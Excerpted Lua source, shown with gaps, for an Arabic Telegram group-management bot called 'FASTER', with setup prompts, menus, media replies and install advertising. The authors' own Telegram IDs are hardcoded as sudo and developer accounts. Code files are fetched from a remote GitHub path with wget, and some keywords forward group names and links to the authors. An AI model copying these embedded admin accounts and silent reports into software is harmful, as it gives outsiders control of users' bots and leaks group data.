...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡\n\27[0;33;49m')
...
io.write('\27[1;31m ♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡ ارسل لي يوزر المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
local SUDOUSERNAME = io.read():gsub('@','')
if SUDOUSERNAME ~= '' then
io.write('\n\27[1;34m تم حفظ يوزر المطور الاساسي :\n\27[0;39;49m')
database:set(id_server..":SUDO:USERNAME",SUDOUSERNAME)
else
print('\n\27[1;34m لم يتم حفظ يوزر المطور الاساسي :')
end 
os.execute('lua DRAGON.lua')
end
...
print([[
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
تم تنصيب البوت ع سورس فاستر احلي مساا😂
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
        ☆●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●☆
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
 ≂≂≂≂≂≂≂≂≂𝚜𝚘𝚞𝚛𝚌𝚎 𝑭𝑨𝑺𝑻𝑬𝑹≂≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
تم تطوير وبرمجت السورس من خلال      
المبرمج سيزر وتيم السورس.         
╚≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╝
 ≂≂≂≂≂≂≂≂≂𝚜𝚘𝚞𝚛𝚌𝚎 𝑭𝑨𝑺𝑻𝑬𝑹≂≂≂≂≂≂≂≂≂≂
╔≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂≂╗
    𖧷  ☆●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●☆ 𖧷
...
token = sudos.token 
--- start functions ♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡
--------------------------------------------------------------------------------------------------------------
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/#روبت/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1770493345,1804119251 ,2093265110,2068516411}   
...
var = true 
elseif tonumber(user_id) == tonumber(2068516411) then
var = true  
elseif tonumber(user_id) == tonumber(1770493345) then
var = true  
elseif tonumber(user_id) == tonumber(2093265110) then
var = true  
...
if tonumber(user_id) == tonumber(1804119251 ) then  
var = '𓆪الــمــبــرمـج ســيــزر𓆩'
elseif tonumber(user_id) == tonumber(2068516411) then
var = '𓆪الــمــبــرمـج شــادو𓆩'
elseif tonumber(user_id) == tonumber(1770493345) then
var = '𓆪المـبـرمـج ديـشـا𓆩'
elseif tonumber(user_id) == tonumber(2093265110) then
var = '𓆪الــمــبــرمـج فــمــبــيــر𓆩'
elseif tonumber(user_id) == tonumber(SUDO) then
var = '𓆪🌗🐾الـمـطـور الاسـاسـي𓆩'
elseif database:sismember(bot_id.."Dev:SoFi:2", user_id) then
var = "𓆪🌗🐾الـمـطـور الاسـاسـي²𓆩"
elseif tonumber(user_id) == tonumber(bot_id) then  
var = 'البوت'
elseif database:sismember(bot_id..'Sudo:User', user_id) then
...
local UserName = (data.username_ or "FA9SH")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪")  
...
if text == '/start' or text == 'back⚡'  then  
local bl = '◐اهلا بيك في كيب عظمه سورس فاستر'
local keyboard = {
{'𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪'},
{'قسم مطورين السورس'},
{'سعر التنصيب'},
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'فاستر') 
local DRAGON_Msg = { 
...
local Text = [[
𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪
𓆩●سعر التنصيب العادي 15 جنيه●𓆪
𓆩● للتنصيب تواصل معنا ف الاسفل ●𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url="t.me/1804119251 "}},
{{text = '𓆩● 𝐃𝐄𝐒𝐇𝐀 ●𓆪',url="t.me/XxDesha86Xx"}},
{{text = '𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪',url="t.me/FA9SH"}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪
𓆩●سعر السورس عندنا بيبدأ من 150ج●𓆪
𓆩● للشراء تواصل معي ف الاسفل ●𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url="t.me/1804119251 "}},
...
if text == "تمويل ميديا" then
if not DevSoFi(msg) then
local Text = [[
لو عاوز تمول اي اكونت او قناه(سوشيال يعني) ب ارخص الاسعار تواصل مع المبرمج سيزر🙂.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url="t.me/1804119251 "}},
{{text = '𝑭𝑨𝑺𝑻𝑬𝑹',url="t.me/FA9SH"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if not DevSoFi(msg) then
local Text = [[
↯ اهلا بك في قسم القنوات اليك اجمل قنوات في التليجرام ↯
]]
keyboard.inline_keyboard = {
{{text = 'كتابات¹', url="t.me/UU_CH"}},
{{text = 'كتابات²',url="t.me/SPEEd_34"}}, 
{{text = 'قناه السورس',url="t.me/FA9SH"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local Text = 'اهلا بكم ف قسم المميزات اتبع الكيبورد ف الاسفل.'
local Key = {
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'ميم','كرتون'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'الافلام','العاب'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'غنيلي بفيديو','انيمي فيديو'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'رمزيات ولاد','رمزيات بنات'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'استوري'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'ثيم','غنيلي'},
...
if text == 'قسم ديني' then
local Text = 'اهلا بك في القسم الديني..🙂'
local Key = {
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'استوري قران'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'ايات بالصور','احاديث بالصور'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'احاديث','قران'},
{'back⚡'},
}
...
if text == '↝ قسم المتجر ↜' then
local Text = 'مرحبا بك في قسم المتجر للشراء🔥'
local Key = {
{'𓆩● 𝐃𝐄𝐕 3𝐌??𝐑𝐀 ●𓆪'},
{'عايز سورس','عايز بوت'},
{'عايز قناه'},
...
if DevSoFi(msg) then
local bl = '◉ مرحبا بك في سورس فاستر \n◉ [𝙲𝙷 𝚂𝙾𝚄𝚁𝙲𝙴](t.me/FA9SH)'
local keyboard = {
{'سيزر','ديشا'},
{'ضع اسم للبوت'},
{'المطور','الاحصائيات'},
{'⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺'},
{'قسم مطورين السورس','قـسـم الـردود'},
{'قـسم الاشـتراك'},
...
local Text = ' ◐تم ارسال الملصق من ♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/#روبت/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sezr_su/17&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'قـسـم الـردود' and DevSoFi(msg) then 
...
if text == 'قـسم الاشـتراك' and DevSoFi(msg) then 
local Text = 'قـسم الاشـتراك يوجد في الاشتراك الاجباري للبوت...'
local Key = {
{'الاشتراك الاجباري'},
...
send(msg.chat_id_, msg.id_,' ◐ اصدار سورس فاستر{ 5x☆}')
end

if text == '𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪' then
local Text = [[ 
[𝑭𝑨𝑺𝑻𝑬𝑹](http://t.me/FA9SH)
[●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●](http://t.me/1804119251 )
[𝐃𝐄𝐒𝐇𝐀](http://t.me/XxDesha86Xx)
[𝐕 𝘼 𝙈 𝘽 𝙄 𝙍](http://t.me/XxlllllllllllllllllllllllllllxX)

[𝐂𝐇 𝐒𝐎𝐔𝐑𝐂𝐄](http://t.me/FA9SH)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url="t.me/1804119251 "},{text = '𝐃𝐄𝐒𝐇𝐀', url="t.me/XxDesha86Xx"}},
{{text = '★ 𝑭𝑨𝑺𝑻𝑬𝑹 ★ ',url="t.me/FA9SH"}},
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/sezr_su/17&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
...
if text == '⩹━━━⊶𝑭𝑨𝑺𝑻𝑬𝑹⊷━━━⩺' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس فاستر ادخل وتابع الجديد](t.me/FA9SH)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪', url="t.me/FA9SH"}}, 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sezr_su/17&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'معلومات الكيبورد' and DevSoFi(msg) then
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/FA9SH)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ☆من أحسن السورسات على التليجرام سورس فاستر ⛧
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'ՏOᑌᖇᑕᗴ KIᑎᘜ', url="t.me/FA9SH"}}, 
} 
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FA9SH/355&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if SudoBot(msg) and text == 'اذاعه' then   
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "فاستر")
...
send(msg.chat_id_,0," ◐ الـعـضو  : {["..data.first_name_.."](T.ME/FA9SH)}\n ◐ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ◐ عذرا  ⇇{["..data.first_name_.."](T.ME/FA9SH)}\n ◐ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
if text and text:match("^المطور$") or text and text:match("^مطور$") or text and text:match("^عاوز المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
...
sendText(SUDO,"●انت ييعم الزفت في ناس بتنادي عليك روح كلم \n●الواد  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب {`"..msg.chat_id_.."`}\n●رابط الجروب \n ["..LinkGroup.."] ",0,'md')
end,nil)
end,nil)
end

if text and text:match("^سيزر$") or text and text:match("^مبرمج السورس$") or text and text:match("^عبدو$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1804119251 ,"●.هناك شخص يريدك يا سيدي عبدور \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب { `"..msg.chat_id_.."` }\n●رابط الجروب \n [ "..LinkGroup.." ]\n    ●رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end

if text and text:match("^جلب التوكن$") or text and text:match("^التوكن$") or text and text:match("^توكن البوت$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1804119251 ," ● هناك من يحاول الغدر بك يا سيدي عبدو  \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب { `"..msg.chat_id_.."` }\n●رابط الجروب \n [ "..LinkGroup.." ]\n    ●رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end

if text and text:match("^ديشا الخول$") or text and text:match("^ديشا$") or text and text:match("^الخول ديشا$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1770493345,"●.هناك شخص يريدك يا سيدي الخول \n●الشخص  {"..Name.."}\n●اسم الجروب {"..NameChat.."}\n●ايدي الجروب { `"..msg.chat_id_.."` }\n●رابط الجروب \n [ "..LinkGroup.." ]\n    ●رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end
...
local Text = [[
 𖠪 اهلا بك في سورس فاستر الجمدان 𖠪
 𖠪 عايز بوت بأسعار منسبه وبوت مميز كلمني 𖠪  
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' DESHA ',url="t.me/XxDesha86Xx"},{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●', url="t.me/1804119251 "}},
{{text = '𝑭𝑨𝑺𝑻𝑬𝑹 ', url="t.me/FA9SH"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/FA9SH/355/3&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
 
if text == 'مصطفي' or text == 'ديشا' or text == 'مالك السورس'  then
local Text = [[
ديشا مطور السورس للتواصل معه اتبع الزر ف الاسفل.
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩● 𝐃𝐄𝐒𝐇𝐀 ●𓆪',url="t.me/XxDesha86Xx"}},
...
if text == 'سيزر' or text == 'عبدو' or text == 'مبرمج السورس'  then
local Text = [[
سيزر مبرمج السورس للتواصل معه تبع الزر ف الاسفل🔥
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url="t.me/s_e_z_r0 "}},
}
local msg_id = msg.id_/2097152/0.5
...
local Text = [[
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
[🎗╎ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 𝚍𝚎𝚊𝚛 ](http://t.me/FA9SH)
[🚶‍♂╎𝚃𝙷𝙴 𝙱𝙴𝚂𝚃 𝚂𝙾𝚄𝚁𝙲𝙴 𝙸𝙽 𝚃𝙴𝙻𝙶𝚁𝙰𝙼 ](http://t.me/FA9SH)
[ ☠╎ 𝚂𝚃𝚁𝙻𝚅𝙴 𝙵𝙾𝚁 𝚃??𝙴 𝙱𝙴𝚂𝚃 ](http://t.me/FA9SH)
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
──┈┈┈┄┄╌╌╌╌┄┄┈┈┈
•  𝖼𝗁 - [𝑭𝑨𝑺𝑻𝑬𝑹](t.me/FA9SH)
──┈┈┈┄┄╌╌╌╌┄┄┈┈┈
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '•ᴍʏ ᴅᴇᴠ♪', callback_data="/chop"},{text = '•ᴍʏ ᴄʜᴀɴɴᴇʟ♪', callback_data="/meba"}},   
...
if text == 'فمبير' or text == 'فمبير الجامد' or text == 'اخو سيزر'  then
local Text = [[
فمبير هقرر السورس للتواصل معه اتبع الزر ف الاسفل💛
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩● 𝐕 𝘼 𝙈 𝘽 𝙄 𝙍 ●𓆪',url="t.me/XxlllllllllllllllllllllllllllxX"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/XxlllllllllllllllllllllllllllxX&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/estory5124/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
if text == "فيديو انيمي" or text == 'انيمي فيديو' and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,31); 
local Text ='تم اختيار لك فيديو انيمي جديد للمزيد اكتب انيمي فيديو سوف يتم اختيار فيديو انيمي عشوائي🙂💔.' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●', url="t.me/s_e_z_r0 "}},
{{text = '✫ 𝑭𝑨𝑺𝑻𝑬𝑹 ✫',url="t.me/FA9SH"}},
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/enimekin/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "استوري قران" and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,31); 
local Text ='تم اختيار لك استوري هادئه وسيتم التغير عشوائي عند كتب استوري  قران🙂💔' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●'  , url="t.me/s_e_z_r0 "}},
{{text = '《𝚂𝙾𝚄𝚁𝙲𝙴  𝑭𝑨𝑺𝑻𝑬𝑹》',url="t.me/FA9SH"}},
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendVideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/kinghhks/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
ght = math.random(1,62); 
local Text ='تم اختيار هذا الميم لك😹' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url="t.me/s_e_z_r0 "}},
{{text = '𝑭𝑨𝑺𝑻𝑬𝑹',url="t.me/FA9SH"}},
...
if text == "ايات بالصور" or text == 'قران بالصور' and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(4,50); 
local Text ='تم الاختيار لك عشوائي' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = ' ●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩● ',url="t.me/s_e_z_r0 "}},
{{text = '𝑭𝑨𝑺𝑻𝑬𝑹',url="t.me/FA9SH"}},
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/oooapqk/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "كرتون" or text == 'صور كرتون' and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(4,50); 
local Text ='تم اختيار لك اجمل صور كرتون🙂' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url="t.me/s_e_z_r0 "}},
{{text = '𝑭𝑨𝑺𝑻𝑬𝑹',url="t.me/FA9SH"}},
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/CCCIOKO/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == "احاديث بالصور" or text == 'حديث بالصور' and not  database:get(bot_id.."sing:for:me"..msg.chat_id_) then 
ght = math.random(1,62); 
local Text ='تم الاختيار لك عشوائي' 
keyboard = {}  
keyboard.inline_keyboard = { 
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Hh_king_hH/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/K_I_N_GHH/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/GG_KINGJ/'..ght..'&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
" عبدوك ضحيت باشياء لاجل شخص م يسوى ؟", 
...
"حاجة تشوف نفسك مبدع فيها؟ ",
  ...
  "عبدوك بكيت على شخص مات في مسلسل ؟ ",
...
"لو احد تركك وبعد فتره يحاول يرجعك بترجع له ولا خلاص؟ ",
  "برأيك كم العبدو المناسب للزواج؟ ",
...
if text == "حديث" or text == "احاديث" then 
local TWEET_Msg = { 
...
" بِسْمِ اللّهِ الَّذِي لاَ يَضُرُّ مَعَ إسْمِهِ شَىْءٌ في الأَرْضِ وَلا فِي السَّمَاءِ وَهُوَ السَّمِيعُ العَلِيم🌷🍃",
" استغفر الله العظيم وأتوبُ إليه 🌹",
" اللهم إني أسألُك العفَّةَ والعافيةَ في دُنياي ودِيني وأهلي ومالي ، اللهمَّ استُر عَوْرتي وآمِنْ رَوْعَتي ، واحفَظْني من بين يديَّ ومن خلفي",
"ااستغفر الله العظيم وأتوبُ إليه 🌹",
" ﴿يا أَيُّهَا الَّذينَ آمَنُوا اذكُرُوا اللَّهَ ذِكرًا كَثيرًا﴾",
" اللَّهُمّ تولّنا بحسن تدبيرك، وسعة فضلك، وسخر لنا الخير يا ربّ. 🌸💙",
" اللهم إجعل خير عُمري آخره، وخير عملي خواتمه، وخير أيامي يوم ألقاك.🌺",
" اللهم إني أسألُك العفَّةَ والعافيةَ في دُنياي ودِيني وأهلي ومالي ، اللهمَّ استُر عَوْرتي وآمِنْ رَوْعَتي ، واحفَظْني من بين يديَّ ومن خلفي💔",
...
"اللهـم علّق قلبي بالصلاة والقرآن وأرزقني الثبات حتى ألقاك🌸",
"أستغفرك ربي وأتوب إليك، أستغفرك ربي ما أعلم وما لا أعلم وما أنت به أعلم. 🌸",
"رَبِّ أَعُوذُ بِكَ مِنْ هَمَزَاتِ الشَّيَاطِينِ (.) وَأَعُوذُ بِكَ رَبِّ أَنْ يَحْضُرُونِ✨🍃",
" اللهم ما أصبح بي من نعمةِ او بأحدِ من خلقك فمنك وحدك لا شريك لك فلك الحمد ولك الشكر ❥⇣",
" اللهـم علّق قلبي بالصلاة والقرآن وأرزقني الثبات حتى ألقاك🌸",
"{قُل لَّا أَمْلِكُ لِنَفْسِي ضَرًّا وَلَا نَفْعًا إِلَّا مَا شَاءَ اللَّهُ} 🌸💙 [ يونس: 49]",
" اللهم يا عزيز يا جبار اجعل قلوبنا تخشع من تقواك واجعل عيوننا تدمع من خشياك واجعلنا يا رب من أهل التقوى وأهل المغفرة🌹🌿",
"اأستغفرك ربي وأتوب إليك، أستغفرك ربي ما أعلم وما لا أعلم وما أنت به أعلم. 🌸",
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[TWL](t.me/K_I_N_G_1_2_3)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《𝙻𝚃𝚄𝙰𝚂𝙸𝙻 𝚂𝙾𝚄𝚁𝙲𝙴 》', url="t.me/K_I_N_G_1_2_3"}}, 
} 
local msg_id = msg.id_/2097152/0.5
...
◐ روايات ← لعرض الميزه
◐ ثيم ← لعرض الميزه
◐ ثيم فاستر← لعرض الميزه
◐ همسه ← لعرض الميزه
◐ معني + اسمك ← لعرض الميزه
◐ خلفيات ← لعرض الميزه
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
◐ 𝘾𝙃 - [𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪](t.me/FA9SH) 
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●', url="t.me/AsaliyaEgypt"}},
{{text = '𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪', url="t.me/FA9SH"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/V_I_K_I_N_G_2/86/69&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end

if text == 'العاب فاستر' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ◐ اهلا في قائمه الالعاب المتطوره سورس فاستر ◐ 
...
local function taha(extra, taha, success)
if taha.photos_[0] then
